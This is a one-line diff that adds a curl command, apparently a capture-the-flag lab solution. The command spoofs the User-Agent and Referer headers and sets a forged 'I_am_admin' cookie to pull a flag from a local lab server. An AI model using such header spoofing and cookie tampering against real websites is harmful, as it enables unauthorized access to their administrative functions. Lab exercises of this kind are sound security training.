@@ -1,0 +1,1 @@
+curl -A "ft_bornToSec" -e "https://www.nsa.gov/" -b "Name=I_am_admin; Value=68934a3e9455fa72420237eb05902327; Expires=Wed, 15 Mar 2024 02:44:34 GMT" "http://192.168.56.101/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f" | grep flag > flag.txt
